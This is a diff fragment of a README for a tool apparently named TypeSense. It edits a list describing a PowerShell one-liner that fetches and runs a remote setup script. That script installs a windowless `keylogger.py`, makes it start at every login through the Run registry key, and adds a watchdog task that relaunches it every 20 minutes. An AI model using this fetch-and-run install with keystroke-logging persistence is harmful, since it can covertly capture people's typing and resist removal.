@@ -10,7 +10,8 @@ irm https://raw.githubusercontent.com/ricewas-mis-taken/TypeSense/main/setup.ps1
 ```
 
 **What this does:**
-- Installs Python 3.11 via `winget` if Python 3.10+ is not already on the machine
+- Downloads the client files into `%LOCALAPPDATA%\TypeSense\app` and stops with a message if `config.json` is missing
+- Installs Python 3.11 via `winget` if Python 3.10-3.13 is not already on the machine
 - Installs all Python dependencies from `requirements.txt`
 - Registers `pythonw keylogger.py` in the user's `Run` registry key so the logger auto-starts on every login
 - Registers a scheduled task watchdog that relaunches the logger every 20 minutes if it was closed
